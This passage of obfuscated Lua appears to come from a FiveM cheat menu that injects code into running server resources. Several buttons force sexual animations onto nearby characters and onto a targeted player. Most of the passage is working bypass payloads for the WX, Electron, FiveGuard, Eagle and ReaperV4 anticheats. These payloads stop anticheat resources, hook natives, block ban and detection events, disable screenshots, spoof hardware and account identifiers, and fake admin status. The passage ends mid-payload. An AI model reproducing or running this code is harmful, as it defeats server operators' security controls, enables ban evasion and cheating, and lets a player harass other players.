            AttachEntityToEntity(playerPed, closestPed, 11816, 0.0, -0.6, 0.0, 0.5, 0.5, 0.0, true, true, true, true, 0, true)
            
            TriggerEvent('chat:addMessage', { args = { '^2ERP System:', 'Animation applied to nearby ped!' } })
        else
            TriggerEvent('chat:addMessage', { args = { '^1ERP System:', 'No suitable ped found nearby!' } })
        end
    ]]);v400=459 -(337 + 121) ;end if ((2 -1)==v400) then MachoMenuNotification("ERP System","Animation applied to nearby ped!");v150=true;break;end end end);MachoMenuButton(v148,"Fuck Nearby Exhaust",function() local v401=0 -0 ;while true do if (v401==0) then if v150 then local v842=1911 -(1261 + 650) ;while true do if (v842==1) then v150=false;return;end if (v842==(0 + 0)) then MachoInjectResource("monitor",[[
            local playerPed = PlayerPedId()
            ClearPedTasks(playerPed)
            DetachEntity(playerPed, true, true)
            local originalCoords = GetEntityCoords(playerPed)
            SetEntityCoords(playerPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, true)
            TriggerEvent('chat:addMessage', { args = { '^2ERP System:', 'Animation stopped and returned to original position!' } })
        ]]);MachoMenuNotification("ERP System","Animation stopped and returned to original position!");v842=1 -0 ;end end end MachoInjectResource("monitor",[[
        local playerPed = PlayerPedId()
        local playerCoords = GetEntityCoords(playerPed)
        local maxAttachDistance = 10.0
        local vehicles = {}
        local handle, vehicle = FindFirstVehicle()
        local success
        
        repeat
            success, vehicle = FindNextVehicle(handle)
            if success then
                table.insert(vehicles, vehicle)
            end
        until not success
        EndFindVehicle(handle)
        
        local closestVehicle = nil
        local closestDistance = maxAttachDistance
        
        for _, vehicle in ipairs(vehicles) do
            local vehicleCoords = GetEntityCoords(vehicle)
            local distance = Vdist(playerCoords, vehicleCoords)
            if distance < closestDistance then
                closestVehicle = vehicle
                closestDistance = distance
            end
        end
        
        if closestVehicle then
            local vehicleCoords = GetEntityCoords(closestVehicle)
            local heading = GetEntityHeading(closestVehicle)
            local radians = math.rad(heading)
            local rearOffset = 5.0
            local sideOffset = 2.0
            local xRearOffset = rearOffset * math.cos(radians)
            local yRearOffset = rearOffset * math.sin(radians)
            local xSideOffset = sideOffset * math.sin(radians)
            local ySideOffset = -sideOffset * math.cos(radians)
            local offsetCoords = vehicleCoords + vector3(xRearOffset + xSideOffset, yRearOffset + ySideOffset, 0.0)
            
            SetEntityCoords(playerPed, offsetCoords.x, offsetCoords.y, offsetCoords.z, false, false, false, true)
            SetEntityHeading(playerPed, heading)
            
            local animDict = "rcmpaparazzo_2"
            local animName = "shag_loop_a"
            RequestAnimDict(animDict)
            while not HasAnimDictLoaded(animDict) do
                Citizen.Wait(100)
            end
            TaskPlayAnim(playerPed, animDict, animName, 8.0, -8.0, -1, 1, 0, false, false, false)
            
            AttachEntityToEntity(playerPed, closestVehicle, 0, 0.0, -3.0, 0.6, 0.0, 0.0, heading, true, true, false, true, 7, true)
            
            TriggerEvent('chat:addMessage', { args = { '^2ERP System:', 'Animation applied to nearby vehicle exhaust!' } })
        else
            TriggerEvent('chat:addMessage', { args = { '^1ERP System:', 'No suitable vehicle found nearby!' } })
        end
    ]]);v401=1;end if ((1818 -(772 + 1045))==v401) then MachoMenuNotification("ERP System","Animation applied to nearby vehicle exhaust!");v150=true;break;end end end);MachoMenuButton(v148,"Apply Mouth Animation",function() local v402=0 + 0 ;local v403;while true do if (v402==1) then if (v403 and (v403~="")) then MachoInjectResource("monitor",string.format([[
            local targetID = %s
            local targetPed = GetPlayerPed(GetPlayerFromServerId(tonumber(targetID)))
            
            if targetPed and targetPed ~= 0 then
                local playerPed = PlayerPedId()
                
                -- 1st Animation: Mouth animation to target ID
                local animDict1 = "anim@mp_player_intincardockstd@rds@"
                local animName1 = "enter"
                
                RequestAnimDict(animDict1)
                while not HasAnimDictLoaded(animDict1) do
                    Citizen.Wait(0)
                end
                
                -- Put target character in animation and adjust position
                TaskPlayAnim(targetPed, animDict1, animName1, 8.0, -8.0, -1, 1, 0, false, false, false)
                
                -- Wait for target character animation to start
                Citizen.Wait(1000)
                
                -- 2nd Animation: Own character
                local animDict2 = "rcmpaparazzo_2"
                local animName2 = "shag_loop_a"
                
                RequestAnimDict(animDict2)
                while not HasAnimDictLoaded(animDict2) do
                    Citizen.Wait(0)
                end
                
                TaskPlayAnim(playerPed, animDict2, animName2, 8.0, -8.0, -1, 1, 0, false, false, false)
                
                -- Attach characters together - forward, up, mouth level
                -- 11816 = pelvis bone, 0.0 = forward, 0.8 = up, 0.0 = sideways
                AttachEntityToEntity(playerPed, targetPed, 11816, 0.0, 0.8, 0.0, 0.0, 0.0, 0.0, true, true, true, true, 0, true)
                
                -- Fix character direction - facing target character
                local targetHeading = GetEntityHeading(targetPed)
                SetEntityHeading(playerPed, targetHeading)
                
                TriggerEvent('chat:addMessage', { args = { '^2ERP System:', 'Mouth animation applied for ID ' .. targetID .. ' and your character is also animated!' } })
            else
                TriggerEvent('chat:addMessage', { args = { '^1ERP System:', 'Invalid or not found player ID!' } })
            end
        ]],v403));MachoMenuNotification("ERP System","Mouth animation applied for ID "   .. v403   .. " and your character is also animated!" );v150=true;else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end if (v402==(144 -(102 + 42))) then if v150 then local v843=1844 -(1524 + 320) ;while true do if (v843==0) then MachoInjectResource("monitor",[[
            local playerPed = PlayerPedId()
            ClearPedTasks(playerPed)
            DetachEntity(playerPed, true, true)
            TriggerEvent('chat:addMessage', { args = { '^2ERP System:', 'Animation stopped!' } })
        ]]);MachoMenuNotification("ERP System","Animation stopped!");v843=1;end if (1==v843) then v150=false;return;end end end v403=MachoMenuGetInputbox(v149);v402=1271 -(1049 + 221) ;end end end);local v151=MachoMenuAddTab(v4,"Anticheat Check");local v152=166 -(18 + 138) ;local v153=12 -7 ;local v154=MachoMenuGroup(v151,"Anticheat Checker",v3,v152,(v1.x-v3) + (1252 -(67 + 1035)) ,v1.y);local v155="";local v156=false;local v157="";local v158=false;local function v159() local v404=348 -(136 + 212) ;local v405;local v406;local v407;while true do if (v404==1) then v407=GetNumResources();for v790=0,v407-(4 -3)  do local v791=GetResourceByFindIndex(v790);local v792=LoadResourceFile(v791,"fxmanifest.lua");if v792 then if (string.find(v792,"https://electron-services.com") or string.find(v792,"Electron Services") or string.find(v792,"The most advanced fiveM anticheat")) then v405=true;v406=v791;v155=v791;break;end end end v404=2 + 0 ;end if (v404==(0 + 0)) then v405=false;v406="";v404=1;end if ((1606 -(240 + 1364))==v404) then return v405,v406;end end end local function v160() local v408=1082 -(1050 + 32) ;local v409;local v410;local v411;while true do if (v408==0) then v409=false;v410="";v408=3 -2 ;end if (v408==(2 + 0)) then return v409,v410;end if (1==v408) then v411=GetNumResources();for v793=0,v411-1  do local v794=GetResourceByFindIndex(v793);local v795=GetNumResourceMetadata(v794,"client_script");for v844=1055 -(331 + 724) ,v795-(1 + 0)  do local v845=GetResourceMetadata(v794,"client_script",v844);if (v845~=nil) then if string.find(v845,"obfuscated") then v409=true;v410=v794;v157=v794;break;end end end if v409 then break;end end v408=646 -(269 + 375) ;end end end MachoMenuButton(v154,"Scan Electron Anticheat",function() CreateThread(function() local v502=725 -(267 + 458) ;local v503;local v504;while true do if (v502==(0 + 0)) then v503,v504=v159();Wait(192 -92 );v502=819 -(667 + 151) ;end if (v502==1) then if v503 then MachoMenuNotification("[Anticheat Checker]","Electron Anticheat System Found: "   .. v504   .. "" );else MachoMenuNotification("[Anticheat Checker]","Electron Anticheat Not Found!");v155="";v156=false;end break;end end end);end);MachoMenuButton(v154,"Scan FiveGuard",function() CreateThread(function() local v505,v506=v160();Wait(1597 -(1410 + 87) );if v505 then MachoMenuNotification("[Anticheat Checker]","FiveGuard Anticheat System Found: "   .. v506   .. "" );else MachoMenuNotification("[Anticheat Checker]","FiveGuard Anticheat Not Found!");v157="";v158=false;end end);end);MachoMenuButton(v154,"Stop/Start Electron Anticheat",function() CreateThread(function() local v507=1897 -(1504 + 393) ;local v508;local v509;while true do if (v507==0) then v508,v509=v159();Wait(100);v507=2 -1 ;end if (v507==(2 -1)) then if v508 then if  not v156 then local v940=0;while true do if (v940==(796 -(461 + 335))) then MachoResourceStop(v155);MachoMenuNotification("[Anticheat Checker]","Electron Anticheat Stopped: "   .. v155   .. "" );v940=1 + 0 ;end if (v940==1) then v156=true;break;end end else MachoResourceStart(v155);MachoMenuNotification("[Anticheat Checker]","Electron Anticheat Started: "   .. v155   .. "" );v156=false;end else local v884=0;while true do if (v884==1) then v156=false;break;end if (v884==0) then MachoMenuNotification("[Anticheat Checker]","Electron Anticheat Not Found!");v155="";v884=1;end end end break;end end end);end);MachoMenuButton(v154,"Stop/Start FiveGuard Anticheat",function() CreateThread(function() local v510=1761 -(1730 + 31) ;local v511;local v512;while true do if ((1668 -(728 + 939))==v510) then if v511 then if  not v158 then MachoResourceStop(v157);MachoMenuNotification("[Anticheat Checker]","FiveGuard Anticheat Stopped: "   .. v157   .. "" );v158=true;else local v941=0;while true do if ((3 -2)==v941) then v158=false;break;end if (v941==(0 -0)) then MachoResourceStart(v157);MachoMenuNotification("[Anticheat Checker]","FiveGuard Anticheat Started: "   .. v157   .. "" );v941=1;end end end else MachoMenuNotification("[Anticheat Checker]","FiveGuard Anticheat Not Found!");v157="";v158=false;end break;end if (v510==(0 -0)) then v511,v512=v160();Wait(1168 -(138 + 930) );v510=1 + 0 ;end end end);end);local v161=false;local v162="";local function v163() local v412=0 + 0 ;while true do if (v412==0) then for v796=0,GetNumResources() -(1 + 0)  do local v797=GetResourceByFindIndex(v796);if (string.lower(v797)=="zcn-firstblock") then v162=v797;return true;end end return false;end end end local function v164(v413) CreateThread(function() while v161 do local v584=0 -0 ;while true do if (v584==(1766 -(459 + 1307))) then Wait(60000);if (MachoResourceState(v413)=="started") then MachoResourceStop(v413);print("[ZCN] Resource was restarted, stopped again.");MachoMenuNotification("[ZCN Control]","ZCN-FirstBlock restarted, stopped again.");end break;end end end end);end MachoMenuButton(v154,"Stop/Start ZCN-FirstBlock",function() CreateThread(function() local v513=v163();Wait(1970 -(474 + 1396) );if v513 then if  not v161 then MachoResourceStop(v162);MachoMenuNotification("[ZCN Control]","ZCN-FirstBlock Stopped: "   .. v162 );v161=true;v164(v162);else MachoResourceStart(v162);MachoMenuNotification("[ZCN Control]","ZCN-FirstBlock Started: "   .. v162 );v161=false;end else local v722=0;while true do if (v722==(1 -0)) then v161=false;break;end if (0==v722) then MachoMenuNotification("[ZCN Control]","'ZCN-FirstBlock' Script Not Found on Server!");v162="";v722=1 + 0 ;end end end end);end);MachoMenuButton(v154,"WX AntiCheat Bypass",function() local v414=0;local v415;while true do if (1==v414) then MachoInjectResource2(NewThreadNs,v415,[[
        -- ============================================================
        -- WX ANTICHEAT BYPASS V3 - COMPLETE
        -- ============================================================
        -- Full WX AntiCheat Bypass
        -- Blocks: anticheat, screenshots, resources, injections
        -- Heartbeat NOT TOUCHED
        -- ============================================================

        print('[WX Bypass] Activating...')

        -- ============================================================
        -- 1. STOP ALL WX RESOURCES
        -- ============================================================

        local antiCheatResources = {
            'wx_anticheat', 'wx-ac', 'WX-AC', 'WX_AC',
            'anticheat', 'anti-cheat', 'ac',
            'WXAntiCheat', 'WX_AntiCheat'
        }

        CreateThread(function()
            while true do
                Wait(500)
                for _, res in ipairs(antiCheatResources) do
                    if GetResourceState(res) == 'started' then
                        pcall(StopResource, res)
                        print('[WX Bypass] Stopped: ' .. res)
                    end
                end
            end
        end)

        -- ============================================================
        -- 2. OVERWRITE WX GLOBAL VARIABLES
        -- ============================================================

        if wx then
            for k, v in pairs(wx) do
                wx[k] = nil
            end
            wx = {
                Debug = true,
                HeartBeat = { enabled = true, maxTime = 30 },
                OCR = false,
                antiNoClip = false,
                antiFreeCam = false,
                antiTeleport = false,
                antiFastRun = false,
                antiVehicleNoClip = false,
                antiGodMode = false,
                antiInvisible = false,
                antiSpamVehicle = false,
                antiSpamPed = false,
                antiSpamObject = false,
                antiBlacklistedVehiclesSpawn = false,
                antiObjects = false,
                antiPeds = false,
                antiExplosion = false,
                antiParticles = false,
                antiAIs = false,
                antiMenus = false,
                antiOverlay = false,
                antiMagicBullet = false,
                antiRapidFire = false,
                antiNoRecoil = false,
                antiAimbot = false,
                antiSilentAim = false,
                antiDamageBoost = false,
                antiDefenseBoost = false,
                antiTaze = false,
                antiKill = false,
                antiFold = false,
                antiPlateChange = false,
                antiBlacklistPlate = false,
                antiResourceStop = false,
                antiResourceStart = false,
                antiModuleStop = false,
                antiNUIDevTools = false,
                antiStatebagCrash = false,
                antiInfiniteRoll = false,
                antiRadar = false,
                antiSpectate = false,
                antiExplosiveAmmo = false,
                antiInfiniteAmmo = false,
                antiThermal = false,
                antiNightVision = false,
                antiSpoofedShot = false,
                antiSmallPed = false,
                antiInfiniteStamina = false,
                antiSuperJump = false,
                antiBlips = false,
                antiObjectAttach = false,
                antiBlacklistedWeapon = false,
                antiBlacklistedVehicles = false,
                explosionLimit = false,
                fakeTriggers = false,
                messageBlacklist = false,
                antiVDM = false,
                DetectionSharing = false,
                connectPrints = false,
                connectLogs = false,
                disconnectLogs = false,
                ExplosionLogs = false,
                screenshotModule = 'disabled',
                OCRCheckInterval = 9999999,
                punishType = 'LOG',
                showReason = false,
                chatMessages = false,
                pingOnDetect = false,
                spoilerIP = false,
                needDiscord = false,
                txAdminAuth = false,
                autoSQL = false,
                banIDFormat = 1
            }
            print('[WX Bypass] WX overwritten')
        end

        if WX then WX = nil end
        if AntiCheat then AntiCheat = nil end
        if AC then AC = nil end

        -- ============================================================
        -- 3. BLOCK WX EVENTS
        -- ============================================================

        local origRegisterNetEvent = RegisterNetEvent
        local origAddEventHandler = AddEventHandler
        local origTriggerEvent = TriggerEvent
        local origTriggerServerEvent = TriggerServerEvent
        local origDropPlayer = DropPlayer

        local blockEvents = {
            'wx_anticheat:detectclient',
            'wx_anticheat:server:clientXkzuqBwmTjN7Gab4QzuN9QYZJ1WxxU',
            'wx_anticheat:checkIsAdmin',
            'wx_anticheat:isAdmin',
            'wx_anticheat:requestOCRWebhook',
            'wx_anticheat:receiveOCRWebhook',
            'wx_anticheat:requestKey',
            'wx_anticheat:receiveKey',
            'wx_anticheat:openAdminMenu',
            'wx_anticheat:playerBanned',
            'wx_anticheat:playerUnbanned',
            'wx_anticheat:checkUpdates',
            'clearPedTasksEvent',
            'removeWeaponEvent',
            'giveWeaponEvent',
            'ptFxEvent',
            'entityCreated',
            'entityCreating',
            'weaponDamageEvent',
            'explosionEvent',
            'chatMessage'
        }

        RegisterNetEvent = function(eventName)
            if string.find(eventName or '', 'wx_anticheat') or
               string.find(eventName or '', 'anticheat') or
               string.find(eventName or '', 'AntiCheat') then
                return
            end
            for _, blocked in ipairs(blockEvents) do
                if eventName == blocked then
                    return
                end
            end
            return origRegisterNetEvent(eventName)
        end

        AddEventHandler = function(eventName, handler)
            if string.find(eventName or '', 'wx_anticheat') or
               string.find(eventName or '', 'anticheat') or
               string.find(eventName or '', 'AntiCheat') then
                return
            end
            for _, blocked in ipairs(blockEvents) do
                if eventName == blocked then
                    return
                end
            end
            return origAddEventHandler(eventName, handler)
        end

        TriggerEvent = function(eventName, ...)
            if string.find(eventName or '', 'wx_anticheat') or
               string.find(eventName or '', 'anticheat') or
               string.find(eventName or '', 'AntiCheat') then
                return
            end
            for _, blocked in ipairs(blockEvents) do
                if eventName == blocked then
                    return
                end
            end
            return origTriggerEvent(eventName, ...)
        end

        TriggerServerEvent = function(eventName, ...)
            if string.find(eventName or '', 'wx_anticheat') or
               string.find(eventName or '', 'anticheat') or
               string.find(eventName or '', 'AntiCheat') then
                return
            end
            for _, blocked in ipairs(blockEvents) do
                if eventName == blocked then
                    return
                end
            end
            return origTriggerServerEvent(eventName, ...)
        end

        DropPlayer = function(playerId, reason)
            if string.find(reason or '', 'wx') or
               string.find(reason or '', 'anticheat') or
               string.find(reason or '', 'AntiCheat') or
               string.find(reason or '', 'detect') or
               string.find(reason or '', 'ban') then
                return
            end
            return origDropPlayer(playerId, reason)
        end

        -- ============================================================
        -- 4. BLOCK SCREENSHOTS
        -- ============================================================

        local screenshotResources = {
            'screenshot-basic', 'screenshot_basic', 'sc-basic',
            'screenshot', 'Screenshot'
        }

        CreateThread(function()
            while true do
                Wait(200)
                for _, res in ipairs(screenshotResources) do
                    if GetResourceState(res) == 'started' then
                        pcall(StopResource, res)
                    end
                end
            end
        end)

        local screenshotFunctions = {
            'TakeScreenshot', 'SaveScreenshot', 'RequestScreenshot',
            'SendScreenshot', 'GetScreenshot', 'Screenshot',
            'requestScreenshot', 'saveScreenshot', 'takeScreenshot',
            'captureScreenshot', 'makeScreenshot', 'createScreenshot'
        }

        for _, func in ipairs(screenshotFunctions) do
            if _G[func] then
                _G[func] = function()
                    return nil
                end
            end
        end

        -- ============================================================
        -- 5. BLOCK EXPORTS
        -- ============================================================

        if exports then
            local blockedExports = {
                'ban', 'offlineban', 'unban', 'isAdmin',
                'addAdmin', 'removeAdmin', 'whitelistPlayer',
                'removeWhitelist', 'getConfig', 'getAdminType',
                'BanPlayer', 'KickPlayer', 'DetectPlayer',
                'LogPlayer', 'PunishPlayer', 'CheckPlayer',
                'GetPlayerStatus', 'SetPlayerStatus'
            }
            
            local resources = {}
            for i = 0, 255 do
                local res = GetResourceByFindIndex(i)
                if res then
                    table.insert(resources, res)
                end
            end
            
            for _, res in ipairs(resources) do
                if exports[res] then
                    for _, exp in ipairs(blockedExports) do
                        if exports[res][exp] then
                            exports[res][exp] = function()
                                return nil
                            end
                        end
                    end
                end
            end
        end

        -- ============================================================
        -- 6. BLOCK HWID
        -- ============================================================

        local origGetPlayerToken = GetPlayerToken
        GetPlayerToken = function(playerId, index)
            if index == 1 or index == 2 or index == 3 or index == 4 or index == 5 then
                return 'FAKE_HWID_' .. tostring(math.random(100000000, 999999999))
            end
            return origGetPlayerToken(playerId, index)
        end

        local origGetPlayerIdentifiers = GetPlayerIdentifiers
        GetPlayerIdentifiers = function(playerId)
            local ids = origGetPlayerIdentifiers(playerId)
            if ids then
                local fake = {}
                for _, id in ipairs(ids) do
                    if string.find(id, 'license:') then
                        table.insert(fake, 'license:FAKE_LICENSE_' .. tostring(math.random(100000000, 999999999)))
                    elseif string.find(id, 'steam:') then
                        table.insert(fake, 'steam:FAKE_STEAM_' .. tostring(math.random(100000000, 999999999)))
                    else
                        table.insert(fake, id)
                    end
                end
                return fake
            end
            return ids
        end

        -- ============================================================
        -- 7. ADMIN STATUS
        -- ============================================================

        if wx and wx.AdminStatus then
            wx.AdminStatus = function(playerId)
                return true
            end
        end

        -- ============================================================
        -- 8. FINAL STARTUP
        -- ============================================================

        print('================================================')
        print('[WX Bypass] WX AntiCheat fully bypassed!')
        print('[WX Bypass] Screenshots blocked!')
        print('[WX Bypass] All exports blocked!')
        print('[WX Bypass] Heartbeat NOT TOUCHED!')
        print('================================================')

        CreateThread(function()
            while true do
                Wait(15000)
                print('[WX Bypass] Protection active')
            end
        end)
    ]]);MachoMenuNotification("WX Bypass","WX AntiCheat bypass activated!");v414=2;end if (v414==0) then v415=nil;if (GetResourceState("monitor")=="started") then v415="monitor";elseif (GetResourceState("qb-core")=="started") then v415="qb-core";elseif (GetResourceState("es_extended")=="started") then v415="es_extended";else v415="ox_inventory";end v414=1 + 0 ;end if ((5 -3)==v414) then print("[WX Bypass] Activated");break;end end end);MachoMenuButton(v154,"Electron AC Bypass",function() local v416=nil;if (GetResourceState("monitor")=="started") then v416="monitor";elseif (GetResourceState("qb-core")=="started") then v416="qb-core";elseif (GetResourceState("es_extended")=="started") then v416="es_extended";else v416="ox_inventory";end MachoInjectResource2(NewThreadNs,v416,[[
        -- Electron AC Bypass
        print("Electron AC: Bypass activated")
        
        -- Block Electron AC events
        local blockedEvents = {
            "electron:anticheat",
            "electron:detection",
            "electron:ban",
            "electron:kick",
            "electron:punish",
            "electron:report",
            "electron:flag",
            "electron:scan",
            "electron:check",
            "electron:validate",
            "electron:verify",
            "electron:heartbeat",
            "electron:ping",
            "electron:ack",
            "electron:sync",
            "electron:state",
            "electron:status",
            "electron:init",
            "electron:start",
            "electron:stop",
            "electron:restart",
            "electron:block",
            "electron:unblock",
            "electron:inject",
            "electron:detect",
            "electron:log",
            "electron:notify",
            "electron:alert",
            "electron:warn",
            "electron:error",
            "electron:info",
            "electron:debug"
        }
        
        for _, event in ipairs(blockedEvents) do
            RegisterNetEvent(event, function() 
                CancelEvent() 
            end)
        end
        
        -- Also block wildcard patterns
        RegisterNetEvent("electron:.*", function()
            CancelEvent()
        end)
        
        -- Block all Electron related natives
        local nativesToBlock = {
            0x1DD55701034110E5,
            0xFB92A102F1C4DFA3,
            0x01FEE67DB37F59B2,
            0xF1B760881820C952,
            0x67722AEB798E5FAB,
            0xCEDABC5900A0BF97,
            0x6ADAABD3068C5235,
            0x475768A975D5AD17,
            0x3A87E44BB9A01D54,
            0x8483E98E8B888AE2,
            0x937C71165CF334B3,
            0x8DECB02F88F428BC,
            0xB0760331C7AA4155,
            0x0A6DB4965674D243,
            0xB80CA294F2F26749,
            0x34616828CD07F1A1,
            0x6C4D0409BA1A2BC2,
            0xA200EB1EE790F448,
            0x14D6F5678D8F1B37,
            0x5234F9F10919EABA,
            0x580417101DDB492F,
            0xDFB2B516207D3534,
            0x39B5D1B10383F0C8,
            0xEE778F8C7E1142E2,
            0x8D4D46230B2C353A,
            0xE659E47AF827484B,
            0x53E8CB4F48BFE623,
            0xB15162CB5826E9E8,
            0xF5F1E89A970B7796,
            0x424D4687FA1E5652,
            0xC3330A45CCCDB26A,
            0x65019750A0324133,
            0xB77D05AC8C78AADB,
            0x45F6D8EEF34ABEF1,
            0x2497C4717C8B881E,
            0x2E1202248937775C,
            0x015A522136D7F951,
            0x7FEAD38B326B9F74,
            0x7E9DFE24AC1E58EF,
            0x7DCE8BDA0F1C1200,
            0x79CFD9827CC979B6,
            0x47D6F43D77935C75,
            0xD796CB5BA8F20E32,
            0x3133B907D8B32053,
            0x3BE0BB12D25FB305,
            0xC5286FFC176F28A2,
            0xDE4C184B2B9B071A,
            0xAC29253EEF8F0180,
            0x57E457CD2C0FC168,
            0xD5037BA82E12416F,
            0x9A8D700A51CB7B0D,
            0x4805D2B1D8CF94A9,
            0xB2C086CC1BF8F2BF,
            0x77F1BEB8863288D5,
            0x03E8D3D5F549087A,
            0xA6DB27D19ECBB7DA,
            0x1BEDE233E6CD2A1F,
            0xFA7C7F0AADF25D09,
            0xF25DF915FA38C5F3,
            0xDCCFD3F106C36AB4,
            0x4899CB088EDF59B8,
            0x4E209B2C1EAD5159,
            0x2975C866E6713290,
            0x3998B1276A3300E5,
            0xE83D4F9BA2A38914,
            0x7D304C1C955E3E12,
            0x743607648ADD4587,
            0x3A6867B4845BEDA2,
            0x016C090630DF1F89,
            0xE465D4AB7CA6AE72,
            0x1CEA6BFDF248E5D9,
            0xFCDFF7B72D23A1AC,
            0x0267D00AF114F17A,
            0x394BDE2A7BBA031E,
            0x68EDDA28A5976D07,
            0x60DFD0691A170B88,
            0x11E65974A982637C
        }
        
        for _, native in ipairs(nativesToBlock) do
            Citizen.InvokeNative(0x54318C915D27E4CE, native, true)
        end
        
        -- Block NUI messages from Electron
        local _SendNUIMessage = SendNUIMessage
        SendNUIMessage = function(msg)
            if type(msg) == 'table' and msg.action then
                local blockedActions = {
                    "electron",
                    "anticheat",
                    "scan",
                    "check",
                    "report",
                    "flag",
                    "detect",
                    "ban",
                    "kick",
                    "punish",
                    "block",
                    "inject",
                    "log",
                    "alert",
                    "warn"
                }
                for _, action in ipairs(blockedActions) do
                    if string.find(string.lower(msg.action), action) then
                        return
                    end
                end
            end
            return _SendNUIMessage(msg)
        end
        
        -- Block Electron resources from starting
        local _StartResource = StartResource
        StartResource = function(resourceName)
            if string.find(string.lower(resourceName), "electron") then
                print("Electron AC: Blocked resource start: " .. resourceName)
                return
            end
            return _StartResource(resourceName)
        end
        
        -- Stop Electron resources if running
        local resources = GetNumResources()
        for i = 0, resources - 1 do
            local resource = GetResourceByFindIndex(i)
            if string.find(string.lower(resource), "electron") then
                if GetResourceState(resource) == "started" then
                    StopResource(resource)
                    print("Electron AC: Stopped resource: " .. resource)
                end
            end
        end
        
        print("Electron AC: Bypass active")
        TriggerEvent('chat:addMessage', { args = { '^2Electron AC:', 'Bypass activated successfully!' } })
    ]]);MachoMenuNotification("Electron AC","Electron AC bypass activated!");print("[Electron AC] Bypass activated");end);MachoMenuButton(v154,"FiveGuard Bypass",function() local v417=nil;if (GetResourceState("monitor")=="started") then v417="monitor";elseif (GetResourceState("qb-core")=="started") then v417="qb-core";else v417="ox_inventory";end MachoInjectResource2(NewThreadNs,v417,[[
        print("FiveGuard Bypass: Activating...")
        
        -- Stop FiveGuard resources
        local fiveGuardResources = {
            "FiveGuard", "fiveguard", "FIVEGUARD",
            "fg", "FG", "FiveGuardAC", "fiveguard_ac"
        }
        
        CreateThread(function()
            while true do
                Wait(1000)
                for _, res in ipairs(fiveGuardResources) do
                    if GetResourceState(res) == "started" then
                        pcall(StopResource, res)
                        print("FiveGuard Bypass: Stopped " .. res)
                    end
                end
            end
        end)
        
        -- Block FiveGuard events
        local blockedEvents = {
            "FiveGuard:check", "FiveGuard:detect", "FiveGuard:ban",
            "FiveGuard:kick", "FiveGuard:log", "FiveGuard:scan",
            "FiveGuard:validate", "FiveGuard:verify", "FiveGuard:punish"
        }
        
        for _, event in ipairs(blockedEvents) do
            RegisterNetEvent(event, function() CancelEvent() end)
        end
        
        -- Hook FiveGuard natives
        local nativesToBlock = {
            0x1DD55701034110E5, 0xFB92A102F1C4DFA3, 0x01FEE67DB37F59B2,
            0xF1B760881820C952, 0x67722AEB798E5FAB, 0xCEDABC5900A0BF97,
            0x6ADAABD3068C5235, 0x475768A975D5AD17, 0x3A87E44BB9A01D54,
            0x8483E98E8B888AE2, 0x937C71165CF334B3, 0x8DECB02F88F428BC,
            0xB0760331C7AA4155, 0x0A6DB4965674D243, 0xB80CA294F2F26749,
            0x34616828CD07F1A1, 0x6C4D0409BA1A2BC2, 0xA200EB1EE790F448
        }
        
        for _, native in ipairs(nativesToBlock) do
            Citizen.InvokeNative(0x54318C915D27E4CE, native, true)
        end
        
        print("FiveGuard Bypass: Active")
        TriggerEvent('chat:addMessage', { args = { '^2FiveGuard Bypass:', 'Activated successfully!' } })
    ]]);MachoMenuNotification("FiveGuard","FiveGuard bypass activated!");end);MachoMenuButton(v154,"Eagle AC Bypass",function() local v418=0;local v419;while true do if (v418==(0 + 0)) then v419=nil;if (GetResourceState("monitor")=="started") then v419="monitor";elseif (GetResourceState("qb-core")=="started") then v419="qb-core";else v419="ox_inventory";end v418=1;end if (v418==1) then MachoInjectResource2(NewThreadNs,v419,[[
        print("Eagle AC Bypass: Activating...")
        
        -- Stop Eagle AC resources
        local eagleResources = {
            "Eagle", "eagle", "EagleAC", "eagle_ac",
            "EC-AC", "EC_AC", "EC-PANEL", "EC_PANEL"
        }
        
        CreateThread(function()
            while true do
                Wait(1000)
                for _, res in ipairs(eagleResources) do
                    if GetResourceState(res) == "started" then
                        pcall(StopResource, res)
                        print("Eagle AC Bypass: Stopped " .. res)
                    end
                end
            end
        end)
        
        -- Block Eagle AC events
        local blockedEvents = {
            "Eagle:ban", "Eagle:kick", "Eagle:detect", "Eagle:check",
            "EC-AC:ban", "EC-AC:kick", "EC-AC:detect",
            "EC_AC:ban", "EC_AC:kick", "EC_AC:detect",
            "eagle:ban", "eagle:kick", "eagle:detect",
            "ec-ac:ban", "ec-ac:kick", "ec-ac:detect"
        }
        
        for _, event in ipairs(blockedEvents) do
            RegisterNetEvent(event, function() CancelEvent() end)
        end
        
        -- Block Eagle AC NUI
        local _SendNUIMessage = SendNUIMessage
        SendNUIMessage = function(msg)
            if type(msg) == 'table' and msg.action then
                local blockedActions = {"eagle", "ec", "ban", "kick", "detect", "anticheat"}
                for _, action in ipairs(blockedActions) do
                    if string.find(string.lower(msg.action), action) then
                        return
                    end
                end
            end
            return _SendNUIMessage(msg)
        end
        
        print("Eagle AC Bypass: Active")
        TriggerEvent('chat:addMessage', { args = { '^2Eagle AC Bypass:', 'Activated successfully!' } })
    ]]);MachoMenuNotification("Eagle AC","Eagle AC bypass activated!");break;end end end);MachoMenuButton(v154,"ReaperV4 Bypass",function() local v420=0 -0 ;local v421;while true do if (v420==(4 -3)) then MachoInjectResource2(NewThreadNs,v421,[[
        print("ReaperV4 Bypass: Activating...")
        
        -- Stop Reaper resources
        local reaperResources = {
            "ReaperV4", "Reaper", "reaper", "REAPER"
        }
        
        CreateThread(function()
            while true do
                Wait(1000)
                for _, res in ipairs(reaperResources) do
                    if GetResourceState(res) == "started" then
                        pcall(StopResource, res)
                        print("ReaperV4 Bypass: Stopped " .. res)
                    end
                end
            end
        end)
        
        -- Hook Reaper natives
        local nativesToBlock = {
            0xC6D3D26810C8E0F9, 0x8D4D46230B2C353A, 0xB15162CB5826E9E8,
            0xD5037BA82E12416F, 0xFB92A102F1C4DFA3, 0x19CAFA3C87F7C2FF,
            0xA200EB1EE790F448, 0x5234F9F10919EABA, 0x997ABD671D25CA0B
        }
        
        for _, native in ipairs(nativesToBlock) do
            Citizen.InvokeNative(0x54318C915D27E4CE, native, true)
        end
        
        -- Block Reaper events
        local blockedEvents = {
            "Reaper:NewDetection", "Reaper:detection", "Reaper:ban",
            "Reaper:kick", "Reaper:punish", "Reaper:log"
        }
        
        for _, event in ipairs(blockedEvents) do
            RegisterNetEvent(event, function() CancelEvent() end)
        end
        
        print("ReaperV4 Bypass: Active")
        TriggerEvent('chat:addMessage', { args = { '^2ReaperV4 Bypass:', 'Activated successfully!' } })
